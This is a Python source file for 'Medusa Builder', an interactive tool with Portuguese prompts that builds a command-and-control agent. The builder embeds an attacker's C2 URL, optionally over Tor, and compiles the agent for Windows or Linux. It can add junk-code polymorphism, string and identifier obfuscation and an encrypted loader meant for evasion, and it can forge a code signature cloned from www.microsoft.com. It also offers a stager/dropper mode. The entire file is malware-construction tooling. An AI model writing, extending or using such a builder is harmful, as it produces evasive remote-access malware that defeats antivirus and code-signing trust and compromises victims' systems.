import tempfile
import shutil
import sys
import questionary
import base64
import json
from pathlib import Path
from rich.console import Console
from rich.panel import Panel

from strategies.stager import run_stager_interactive
from strategies.signing import CodeSigningStrategy, NullSignature
from strategies.mutation import LoaderPackingStrategy
from strategies.base import BuildContext
from strategies.obfuscation import StringObfuscationStrategy, IdentifierManglingStrategy
from strategies.compilation import PyInstallerCompilation, NuitkaCompilation, ScriptOutput
from strategies.mutation import JunkCodeInsertionStrategy

console = Console()

BASE_DIR             = Path(__file__).parent
AGENT_TEMPLATE_PATH  = BASE_DIR / 'agente' / 'agent.py'
AGENT_TOR_TEMPLATE_PATH = BASE_DIR / 'agente' / 'agent_tor.py'
PAYLOADS_DIR         = BASE_DIR / 'payloads'


def _ask(prompt_fn):
    """Wrapper que converte None (Ctrl+C no questionary) em KeyboardInterrupt."""
    result = prompt_fn()
    if result is None:
        raise KeyboardInterrupt
    return result


def _validate_url(url: str) -> bool | str:
    if not url:
        return "URL não pode ser vazia."
    if not (url.startswith('http://') or url.startswith('https://')):
        return "URL deve começar com http:// ou https://"
    return True


class AgentBuilder:

    def __init__(self, config: dict):
        self.context = BuildContext(config)
        self.context.base_dir = BASE_DIR
        self.pipeline = []

    def add_step(self, strategy):
        self.pipeline.append(strategy)
        return self

    def _prepare_env(self):
        self.context.build_dir = Path(tempfile.mkdtemp(prefix="medusa_build_"))

        template_path = self.context.config['template_to_use']
        if not template_path.exists():
            raise FileNotFoundError(
                f"Template do agente não encontrado: {template_path}\n"
                f"Verifique se a pasta 'agente/' existe com agent.py e agent_tor.py."
            )

        agent_code = template_path.read_text(encoding='utf-8')
        patched_code = agent_code.replace(
            "%%C2_SERVER_URL%%", self.context.config['c2_url']
        )

        self.context.entry_script_path = self.context.build_dir / "patched_agent.py"
        self.context.entry_script_path.write_text(patched_code, encoding='utf-8')

    def _finalize_build(self):
        if self.context.final_artifact_path and self.context.final_artifact_path.exists():
            PAYLOADS_DIR.mkdir(exist_ok=True)
            dest_path = PAYLOADS_DIR / self.context.final_artifact_path.name
            shutil.move(str(self.context.final_artifact_path), dest_path)
            console.print(f"\n[bold green]SUCESSO! Agente salvo em: {dest_path}[/bold green]")

            # Exibe resumo do build log
            if self.context.build_log:
                console.print("\n[bold cyan]─── Resumo do Build ───[/bold cyan]")
                for entry in self.context.build_log:
                    console.print(f"  [dim]• {entry}[/dim]")
        else:
            console.print(
                "\n[bold red]ERRO: Artefato final não encontrado. "
                "Verifique os logs acima.[/bold red]"
            )

    def _cleanup(self):
        if self.context.build_dir and self.context.build_dir.exists():
            shutil.rmtree(self.context.build_dir, ignore_errors=True)

    def build(self):
        try:
            self._prepare_env()
            for i, step in enumerate(self.pipeline):
                console.print(
                    f"\n[bold blue]─── Passo {i+1}/{len(self.pipeline)}: "
                    f"{step.__class__.__name__} ───[/bold blue]"
                )
                self.context = step.execute(self.context)
            self._finalize_build()
        except FileNotFoundError as e:
            console.print(f"\n[bold red]ERRO (arquivo não encontrado): {e}[/bold red]")
        except ValueError as e:
            console.print(f"\n[bold red]ERRO (configuração inválida): {e}[/bold red]")
        except RuntimeError as e:
            console.print(f"\n[bold red]ERRO (build falhou): {e}[/bold red]")
        except Exception as e:
            console.print(f"\n[bold red]ERRO INESPERADO: {e}[/bold red]")
            import traceback
            console.print(traceback.format_exc())
        finally:
            self._cleanup()


def _check_compiler_available(compiler: str) -> bool:
    """Verifica se PyInstaller ou Nuitka estão instalados antes de iniciar o build."""
    import subprocess
    try:
        if compiler == 'pyinstaller':
            subprocess.run(['pyinstaller', '--version'], capture_output=True, check=True)
        elif compiler == 'nuitka':
            subprocess.run([sys.executable, '-m', 'nuitka', '--version'],
                           capture_output=True, check=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False


def main_interactive():
    console.print(Panel(
        "Medusa Builder",
        style="bold magenta",
        border_style="magenta",
        expand=False
    ))

    try:
        main_choice = _ask(lambda: questionary.select(
            "O que você deseja construir?",
            choices=['Agente Final', 'Stager / Dropper', 'Sair']
        ).ask())

        if main_choice == 'Sair':
            console.print("\n[dim]Operação finalizada.[/dim]")
            return

        if main_choice == 'Stager / Dropper':
            run_stager_interactive()
            return

        # ── Agente Final ──────────────────────────────────────────────────
        answers = {}

        connection_choice = _ask(lambda: questionary.select(
            "Método de conexão do agente:",
            choices=[
                "Conexão Direta (https://meuservidor.com)",
                "Conexão via Tor (.onion — requer Tor no alvo)"
            ]
        ).ask())

        if "Tor" in connection_choice:
            answers['template_to_use'] = AGENT_TOR_TEMPLATE_PATH
            c2_url = _ask(lambda: questionary.text(
                "URL do C2 (.onion):",
                validate=lambda t: bool(t) or "URL não pode ser vazia."
            ).ask())
            if c2_url and not c2_url.startswith('http://'):
                c2_url = 'http://' + c2_url
            answers['c2_url'] = c2_url
            console.print("[dim]Modo Tor — usando agent_tor.py.[/dim]")
        else:
            answers['template_to_use'] = AGENT_TEMPLATE_PATH
            c2_url = _ask(lambda: questionary.text(
                "URL do C2:",
                validate=_validate_url
            ).ask())
            if c2_url and not (c2_url.startswith('http://') or c2_url.startswith('https://')):
                c2_url = 'https://' + c2_url
            answers['c2_url'] = c2_url
            console.print("[dim]Modo direto — usando agent.py.[/dim]")

        answers['platform'] = _ask(lambda: questionary.select(
            "Plataforma alvo:", choices=['windows', 'linux']
        ).ask())

        answers['type'] = _ask(lambda: questionary.select(
            "Tipo de saída:", choices=['executável', 'script (.py)']
        ).ask())

        answers['polymorphic'] = _ask(lambda: questionary.confirm(
            "Aplicar polimorfismo (junk code)?"
        ).ask())

        answers['obfuscate'] = _ask(lambda: questionary.confirm(
            "Aplicar ofuscação (strings + identifiers)?"
        ).ask())

        answers['use_loader'] = _ask(lambda: questionary.confirm(
            "Empacotar com loader criptografado (alta evasão)?"
        ).ask())

        if answers['type'] == 'executável':
            answers['compiler'] = _ask(lambda: questionary.select(
                "Compilador:", choices=['pyinstaller', 'nuitka']
            ).ask())

            # Verifica disponibilidade do compilador antes de prosseguir
            if not _check_compiler_available(answers['compiler']):
                console.print(
                    f"[bold red]ERRO: {answers['compiler']} não está instalado. "
                    f"Execute: pip install {answers['compiler']}[/bold red]"
                )
                return

            ext = 'exe' if answers['platform'] == 'windows' else 'elf'
            default_name = f"agent.{ext}"
            answers['output'] = _ask(lambda: questionary.text(
                "Nome do arquivo de saída:", default=default_name
            ).ask())

            extra_args_str = _ask(lambda: questionary.text(
                "Argumentos extras para o compilador (deixe em branco para nenhum):"
            ).ask())
            answers['extra_args'] = extra_args_str.split() if extra_args_str.strip() else []

            if answers['platform'] == 'windows':
                answers['sign_executable'] = _ask(lambda: questionary.confirm(
                    "Forjar assinatura de código (requer sigthief.py)?"
                ).ask())
                if answers['sign_executable']:
                    answers['sign_host'] = _ask(lambda: questionary.text(
                        "Host para clonar certificado:", default="www.microsoft.com"
                    ).ask())
            else:
                answers['sign_executable'] = False
        else:
            answers['compiler'] = None
            answers['sign_executable'] = False
            answers['output'] = _ask(lambda: questionary.text(
                "Nome do arquivo de saída:", default="agent.py"
            ).ask())
            answers['extra_args'] = []

        # ── Montagem do Pipeline ───────────────────────────────────────────
        console.print("\n[bold blue]Montando pipeline de build...[/bold blue]")

        builder = AgentBuilder(answers)

        if answers.get('polymorphic'):
            builder.add_step(JunkCodeInsertionStrategy())

        if answers.get('obfuscate'):
            builder.add_step(StringObfuscationStrategy())
            builder.add_step(IdentifierManglingStrategy())

        if answers.get('use_loader'):
            builder.add_step(LoaderPackingStrategy())

        if answers['type'] == 'executável':
            if answers.get('compiler') == 'nuitka':
                builder.add_step(NuitkaCompilation())
            else:
                builder.add_step(PyInstallerCompilation())

            if answers.get('sign_executable'):
                builder.add_step(CodeSigningStrategy())
            else:
                builder.add_step(NullSignature())
        else:
            builder.add_step(ScriptOutput())

        builder.build()

    except KeyboardInterrupt:
        console.print("\n[bold red]Operação cancelada pelo usuário.[/bold red]")
    except Exception as e:
        console.print(f"\n[bold red]Erro inesperado: {e}[/bold red]")
        import traceback
        console.print(traceback.format_exc())


if __name__ == "__main__":
    main_interactive()
